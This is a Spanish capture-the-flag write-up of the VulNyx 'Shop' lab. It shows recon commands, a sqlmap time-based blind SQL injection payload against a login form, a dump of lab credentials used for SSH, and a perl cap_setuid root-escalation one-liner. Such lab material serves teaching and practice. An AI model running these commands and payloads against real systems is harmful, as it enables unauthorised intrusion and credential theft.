# VulNyx — Shop · Writeup

---

## 📌 Scope / Alcance

Laboratorio de pentesting **autorizado** de la plataforma VulNyx, montado en un entorno de red local aislado (VirtualBox). El objetivo es comprometer la máquina **Shop** de forma íntegra: obtener un acceso inicial (foothold), leer la flag de usuario (`user.txt`) y escalar privilegios hasta `root` para leer `root.txt`.

Todas las pruebas se realizan contra una máquina propia en un entorno controlado. No se ataca ningún sistema de terceros.

---

## 🧾 Información del objetivo

| Campo | Valor |
|-------|-------|
| Nombre | Shop (VulNyx Shop) |
| IP objetivo | `192.168.0.9` |
| IP atacante | `192.168.0.13` |
| Gateway | `192.168.0.1` |
| Sistema operativo | Debian 10 (buster) |
| Puertos abiertos | `22/tcp` (SSH) · `80/tcp` (HTTP) |
| Servidor web | Apache/2.4.38 (Debian) |
| Base de datos | MariaDB (MySQL ≥ 5.0.12) |
| Flag de usuario | `598a05f84190e3xxxxxxxxxxxxx` |
| Flag de root | `1c4cddb6c20e0e75xxxxxxxxxxxx` |

---

## 🗂️ Índice

1. [Reconocimiento de red (host discovery)](#1-reconocimiento-de-red-host-discovery)
2. [Enumeración de puertos y servicios](#2-enumeración-de-puertos-y-servicios)
3. [Enumeración web (HTTP)](#3-enumeración-web-http)
4. [Explotación: SQL Injection en el panel de login](#4-explotación-sql-injection-en-el-panel-de-login)
5. [Extracción de credenciales de la base de datos](#5-extracción-de-credenciales-de-la-base-de-datos)
6. [Foothold: acceso por SSH (password reuse)](#6-foothold-acceso-por-ssh-password-reuse)
7. [Escalada de privilegios: Linux Capabilities](#7-escalada-de-privilegios-linux-capabilities)
8. [Cadena de ataque (resumen)](#8-cadena-de-ataque-resumen)

---

## 1. Reconocimiento de red (host discovery)

Antes de tocar el objetivo necesitamos entender **dónde estamos** y **qué hay vivo** en el segmento.

### Identificación del segmento de red

```bash
ip -br addr
```

![Identificación de segmento de red](images/Identificaci_n_de_segmento_de_red.png)

**Por qué:** `ip -br addr` muestra las interfaces en formato breve. Confirmamos que nuestra interfaz `eth0` tiene la IP `192.168.0.13/24`. El `/24` nos dice que el segmento es `192.168.0.0/24` (256 direcciones posibles), que será el rango a barrer.

### Identificación de la puerta de enlace

```bash
ip route
```

![Identificación de puerta de enlace](images/Identificaci_n_de_puerta_de_enlace.png)

**Por qué:** conocer la gateway (`192.168.0.1`) nos permite entender la topología y descartarla como objetivo. La ruta por defecto confirma que todo el tráfico de salida pasa por ese router.

### Descubrimiento de hosts por ARP

```bash
sudo nmap -sn -PR 192.168.0.0/24 -oA host-discovery-inicial
```

![ARP Host Discovery](images/ARP_Host_Discovery.png)

**Por qué ARP (`-PR`):** en una red local (mismo dominio de broadcast), el descubrimiento por **ARP** es el más fiable y veloz. A diferencia del ping ICMP —que suele estar filtrado por firewalls— **ningún host puede ignorar ARP** si quiere comunicarse en la LAN. La opción `-sn` desactiva el escaneo de puertos (solo queremos saber qué está vivo).

De los 9 hosts detectados, el objetivo es **`192.168.0.9`**, cuya MAC (`08:00:27:...`) pertenece al rango OUI de **Oracle VirtualBox**, delatando que es la VM del laboratorio.

### Listado limpio de hosts vivos

```bash
awk '/Status: Up/ {print $2}' host-discovery-inicial.gnmap
```

![ARP Host Discovery List](images/ARP_Host_Discovery_List.png)

**Por qué:** `awk` filtra el archivo `.gnmap` (formato *greppable*) para extraer únicamente las IPs con estado `Up`, dejando una lista limpia y reutilizable para los siguientes escaneos.

---

## 2. Enumeración de puertos y servicios

### Escaneo completo de puertos TCP

```bash
sudo nmap -sS -p- 192.168.0.9 -oA port-scanning-full-tcp-192.168.0.9
```

![Descubrimiento de puertos](images/Descubrimiento_de_puertos.png)

**Por qué `-p-` y `-sS`:**
- `-p-` escanea **los 65535 puertos**. Nunca asumimos que los servicios están en los puertos "típicos": un escaneo parcial puede dejar pasar vectores escondidos en puertos altos.
- `-sS` (SYN scan / *half-open*) es rápido y algo más sigiloso: no completa el *handshake* TCP completo.

**Resultado:** solo dos puertos abiertos.

| Puerto | Servicio |
|--------|----------|
| `22/tcp` | SSH |
| `80/tcp` | HTTP |

Esto define la estrategia: **el 80 es la superficie de ataque para conseguir el foothold**, y el **22 (SSH)** será probablemente la vía de acceso una vez que obtengamos credenciales.

### Detección de sistema operativo

```bash
sudo nmap -O 192.168.0.9 -oA os-fingerprint-192.168.0.9
```

![Descubrimiento de Sistema Operativo](images/Descubrimiento_de_Sistema_Operativo.png)

**Por qué:** el *fingerprinting* de SO (`-O`) analiza las respuestas de la pila TCP/IP para estimar el sistema. Reporta un kernel Linux, consistente con el Debian que luego confirmaremos por las cabeceras HTTP. Es contexto útil para elegir exploits de escalada adecuados.

---

## 3. Enumeración web (HTTP)

### Inspección de cabeceras HTTP

```bash
curl -I http://192.168.0.9 | tee http-headers-inicial-192.168.0.9.txt
```

![Inspección de cabecera HTTP puerto 80](images/Inspecci_n_de_cabecera_http_puerto_80.png)

**Por qué:** `curl -I` pide **solo las cabeceras** (método HEAD). Nos revela el stack del servidor: **Apache/2.4.38 (Debian)**. Identificar la versión exacta permite buscar vulnerabilidades conocidas asociadas y entender el entorno (Debian 10 "buster").

### Búsqueda de `robots.txt`

```bash
curl -i http://192.168.0.9/robots.txt | tee http-robots-inicial-192.168.0.9.txt
```

![Inspección vía curl de archivo robots.txt](images/Inspecci_n_via_curl_de_archivo_robotstxt.png)

**Por qué:** `robots.txt` suele listar rutas que el administrador no quiere indexar… lo que a veces delata directorios interesantes. En este caso devuelve **404 Not Found**, así que se descarta esa vía.

### Fuzzing de directorios con Gobuster

```bash
gobuster dir -u http://192.168.0.9 \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 10 -o gobuster-common-192.168.0.9.txt
```

![HTTP Directory Enumeration with Gobuster](images/HTTP_Directory_Enumeration_with_Gobuster.png)

**Por qué:** gran parte del contenido web no está enlazado desde la página principal. El *fuzzing* de directorios prueba miles de rutas comunes contra el servidor para descubrir contenido oculto. Hallazgos:

| Ruta | Código | Interpretación |
|------|--------|----------------|
| `/administrator/` | 301 | **Panel de login** → nuestro objetivo principal |
| `/css/`, `/fonts/`, `/js/` | 301 → 403 | Directorios existentes pero sin *listing* |
| `index.html` | 200 | Página pública |
| `.htpasswd`, `.htaccess`, `server-status` | 403 | Protegidos |

### Visualización de las rutas en el navegador

El panel de administración:

![Visualización de página administrator en navegador](images/Visualizaci_n_de_pagina_administrator_en_navegador.png)

Los directorios `/css/`, `/fonts/` y `/js/` responden **403 Forbidden** (el *directory listing* está deshabilitado, no podemos listar su contenido):

![Visualización de página css](images/Visualizaci_n_de_pagina_css_en_navegador.png)
![Visualización de página fonts](images/Visualizaci_n_de_pagina_fonts_en_navegador.png)
![Visualización de página js](images/Visualizaci_n_de_pagina_js_en_navegador.png)

**Conclusión de la fase:** el único punto de interacción real es el **formulario de login** en `/administrator/`. Hacia ahí enfocamos el ataque.

---

## 4. Explotación: SQL Injection en el panel de login

### Captura de la petición con Burp Suite

Interceptamos un intento de login (`username=test`, `password=test`) para conocer la petición exacta:

![Intercepto de query con Burp Suite](images/INTERCEPTO_QUERY_con_burpsuite_panel_administrator.png)

**Por qué:** necesitamos la **petición HTTP cruda** (método, endpoint, cabeceras, cookie de sesión y parámetros) para alimentar a `sqlmap`. Observamos:

- Endpoint real: `POST /administrator/login.php`
- Parámetros: `username`, `password`, `submit`
- Cookie de sesión `PHPSESSID`

Guardamos esa petición cruda en un archivo `req.txt` (desde Burp → *Copy to file*, o manualmente respetando la línea en blanco entre cabeceras y cuerpo).

### Detección automática de la inyección con sqlmap

```bash
sqlmap -r req.txt -p username --batch
```

![Descubrimiento de vulnerabilidades con sqlmap](images/Descubrimiento_de_vulnerabilidades_con_sqlmap.png)

**Desglose del comando:**
- `-r req.txt` → sqlmap lee la petición desde el archivo (hereda URL, cookie y parámetros).
- `-p username` → inyecta **únicamente** en el parámetro `username`, el candidato más probable (es el campo que se consulta primero contra la tabla de usuarios).
- `--batch` → responde automáticamente a todas las preguntas interactivas con la opción por defecto.

**Resultado:** el parámetro `username` es vulnerable a **SQL Injection time-based blind**:

```
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test' AND (SELECT 7989 FROM (SELECT(!SLEEP(5)))KtXh) AND 'rWKi'='rWKi&password=test&submit=
```

**¿Qué significa "time-based blind"?** La aplicación no devuelve el resultado de la consulta ni mensajes de error (inyección *a ciegas*). La técnica consiste en inyectar una condición que, si es verdadera, obliga a la base a **dormir N segundos** (`SLEEP(5)`). Midiendo el tiempo de respuesta, se infiere bit a bit la información. Es más lento, pero igual de efectivo.

Dos detalles relevantes que reporta sqlmap:
- **Redirección 302 a `profile.php`** → la inyección también permite **bypassear la autenticación** (una condición verdadera "loguea").
- **UNION injectable con 2 columnas** → vector alternativo más rápido para extraer datos.

Backend confirmado: **MySQL ≥ 5.0.12 (fork MariaDB)** sobre Debian 10 / Apache 2.4.38.

---

## 5. Extracción de credenciales de la base de datos

El flujo de extracción es **acumulativo**: cada paso usa el nombre descubierto en el anterior (bases → tablas → columnas → datos).

### Paso 1 — Listar las bases de datos

```bash
sqlmap -r req.txt -p username --batch --dbs
```

![Solicito listar todas las bases de datos](images/Ya_encontrada_la_vunerabilidad_copn_sqlmap_solicito_listar_todas_las_bases_de_datos.png)
![Listado final de bases de datos](images/Listado_fina_lde_bases_de_datos_listadas_con_sqlmap.png)

**Por qué:** `--dbs` enumera todas las bases disponibles. De las cuatro, tres son del sistema (`information_schema`, `mysql`, `performance_schema`) y **`Webapp`** es la de la aplicación → nuestra base de interés.

### Paso 2 — Listar las tablas de `Webapp`

```bash
sqlmap -r req.txt -p username --batch -D Webapp --tables
```

![Listado de tablas con sqlmap — Users](images/Listado_de_tablas_con_sqlmap_Users.png)

**Por qué:** `-D Webapp --tables` enumera las tablas de esa base. Resultado: una sola tabla, **`Users`** (ojo con las mayúsculas). Ahí deberían estar las credenciales.

### Paso 3 — Volcar la tabla `Users`

```bash
sqlmap -r req.txt -p username --batch -D Webapp -T Users --dump
```

![Volcado de información tabla Users](images/Volcado_de_informaci_n_tabla_Users_en_Shop.png)
![Listado final de usuarios y contraseñas](images/Listado_final_de_usuarios_y_contrase_a_sqlmap_en_tabla_Users.png)

**Por qué:** `--dump` extrae todo el contenido de la tabla. **Hallazgo crítico:** las contraseñas están almacenadas **en texto plano** (sin hashear), por lo que no hace falta crackear nada:

| id | username | password |
|----|----------|----------|
| 1 | peter | `peter123!` |
| 2 | mike | `mikeblabla` |
| 3 | bart | `b4rtp0w4` |
| 4 | liam | `liam@nd3rs0n` |

> 🔎 **Nota didáctica:** almacenar contraseñas en claro es una vulnerabilidad grave por sí misma (**CWE-256 / CWE-312**). Lo correcto sería guardar *hashes* con un algoritmo lento y con sal (bcrypt, Argon2). Este error nos ahorra la fase de cracking con `john`/`hashcat`.

### Las credenciales NO servían para la web

Probamos los cuatro usuarios en el panel `/administrator/`. Todos autentican, pero caen en `profile.php` con un cartel **"Under Construction"**: no hay funcionalidad explotable por la web.

![Login con usuario peter](images/Login_con_usuario_peter.png)
![Login con usuario mike](images/Login_con_usuario_mike.png)
![Login con usuario bart](images/Login_con_usuario_bart.png)
![Login con usuario liam](images/Login_con_usuario_liam.png)

**Por qué es importante entender esto:** el panel web era un *señuelo*. El verdadero valor de esas credenciales está en el **principio de reutilización de contraseñas** (*password reuse*): probarlas en **otros servicios** del mismo host, concretamente **SSH**.

---

## 6. Foothold: acceso por SSH (password reuse)

```bash
ssh bart@192.168.0.9
# password: b4rtp0w4
```

![SSH con usuario bart exitoso y flag de usuario](images/SSH_con_credenciales_encontradas_con_usuario_bart_es_exitoso_y_obtengo_flag.png)

**Por qué `bart`:** probamos las credenciales extraídas contra el servicio SSH descubierto en la fase 2. El par **`bart:b4rtp0w4`** otorga acceso. Esta es la lección central del lab: **las credenciales de una aplicación suelen reutilizarse para el acceso al sistema**.

Ya dentro, enumeramos nuestro contexto:

```bash
whoami        # bart
id            # uid=1000(bart) gid=1000(bart) grupos=1000(bart)
ls
cat user.txt  # 598a05f84190e327bc4796335d948144
```

🏁 **Flag de usuario:** `598a05f84190e327bc4796335d948144`

---

## 7. Escalada de privilegios: Linux Capabilities

### Descartar sudo

```bash
sudo -l
```

![Sin permisos sudo para escalar a root](images/Sin_permisos_sudo_para_escalar_a_root.png)

**Por qué:** el primer chequeo de escalada siempre es `sudo -l` (ver qué podemos ejecutar como otro usuario). Aquí devuelve `sudo: orden no encontrada` — el binario `sudo` ni siquiera está instalado. Vía descartada; hay que buscar otro vector.

### Búsqueda de capabilities

```bash
/usr/sbin/getcap -r / 2>/dev/null
```

![Búsqueda de capabilities para escalar a root](images/Busqueda_de_capabilities_para_escalar_a_root.png)

**Por qué:** las **Linux Capabilities** fragmentan los privilegios de root en permisos granulares que pueden asignarse a binarios concretos. `getcap -r /` busca recursivamente binarios con capabilities asignadas (redirigimos *stderr* a `/dev/null` para silenciar los errores de permisos).

**Hallazgo:**

```
/usr/bin/perl5.28.1 = cap_setuid+ep
/usr/bin/perl       = cap_setuid+ep
```

El binario **`perl`** tiene la capability **`cap_setuid`**. Esto le permite **cambiar su UID efectivo a 0 (root)** sin ser un binario SUID clásico. Es un vector de escalada directo documentado en **GTFOBins**.

### Explotación con GTFOBins

```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

![Escalada a root con GTFOBins y obtención de flag](images/Escalada_a_root_con_gtfobins_y_obtencion_de_flag.png)

**Por qué funciona:** como `perl` posee `cap_setuid`, la llamada `POSIX::setuid(0)` tiene éxito y fija el UID a 0. A continuación `exec "/bin/bash"` reemplaza el proceso por una shell **que ya corre como root**.

```bash
whoami        # root
cd /root
cat root.txt  # 1c4cddb6c20e0e756163b2a9714a1260
```

🏁 **Flag de root:** `1c4cddb6c20e0e756163b2a9714a1260`

---

## 8. Cadena de ataque (resumen)

```
┌─────────────────────────────────────────────────────────────────────┐
│ 1. Recon de red (ARP host discovery)      → objetivo 192.168.0.9     │
│ 2. Nmap -sS -p-                           → 22/SSH, 80/HTTP          │
│ 3. Gobuster                               → /administrator/ (login)  │
│ 4. Burp + sqlmap                          → SQLi time-based blind    │
│ 5. sqlmap --dump (Webapp.Users)           → 4 creds EN TEXTO PLANO   │
│ 6. Password reuse → ssh bart:b4rtp0w4     → FOOTHOLD + user.txt      │
│ 7. getcap → perl cap_setuid (GTFOBins)    → ROOT + root.txt          │
└─────────────────────────────────────────────────────────────────────┘
```

**Las dos vulnerabilidades que encadenan el compromiso total son:**
1. **SQL Injection** no parametrizada en el login → exposición de la base de datos.
2. **Contraseñas en texto plano + reutilización** → acceso al sistema por SSH.
3. **Capability `cap_setuid` sobre `perl`** → escalada a root.

---

### Lecciones para quien está aprendiendo

- **El reconocimiento manda.** El ARP discovery en LAN es más fiable que ICMP; el `-p-` evita perder puertos escondidos.
- **La inyección a ciegas también se explota.** Sin mensajes de error, `time-based` extrae datos midiendo tiempos. Es lenta pero definitiva.
- **Una credencial rara vez vive aislada.** El panel web era un señuelo; el verdadero valor de las contraseñas estaba en SSH (*password reuse*). Siempre probá credenciales encontradas en todos los servicios.
- **`sudo` no es la única vía de escalada.** Cuando falta o está restringido, enumerá **capabilities**, binarios SUID, cron, PATH, etc. **GTFOBins** es tu mejor aliado.
- **Enumerá, no adivines.** Cada fase (red → puertos → web → BD → sistema) alimenta la siguiente con datos concretos.

---

*Writeup realizado en un entorno de laboratorio autorizado (VulNyx). Uso exclusivamente educativo.*
